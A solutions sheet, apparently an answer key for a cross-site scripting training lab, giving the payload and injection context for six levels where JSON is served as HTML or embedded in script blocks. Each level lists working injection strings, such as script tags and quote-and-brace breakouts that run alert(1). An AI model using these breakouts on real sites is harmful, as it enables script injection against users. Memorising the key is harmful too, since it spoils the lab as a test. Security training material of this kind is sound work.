# jsonctx — solutions

JSON-shaped responses that are still treated as HTML (text/html content-type) or are embedded inside `<script>` blocks.

### jsonctx-level1

`/jsonctx/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: body is JSON but Content-Type is text/html — raw HTML injection

### jsonctx-level2

`/jsonctx/level2/?query=%22%7D;alert(1);//`

- payload: `"};alert(1);//`
- context: inside `<script>var data={"q":"..."};</script>` — break out of string+object

### jsonctx-level3

`/jsonctx/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: JSONP response forced to text/html — HTML injection

### jsonctx-level4

`/jsonctx/level4/?query=%22%5D;alert(1);//`

- payload: `"];alert(1);//`
- context: `var items=["..."]` — close string and array, run JS

### jsonctx-level5

`/jsonctx/level5/?query=%22%7D%7D;alert(1);//`

- payload: `"}};alert(1);//`
- context: `var cfg={"user":{"name":"..."}}` — close two objects, run JS

### jsonctx-level6

`/jsonctx/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: JSON with text/html, raw injection in any field
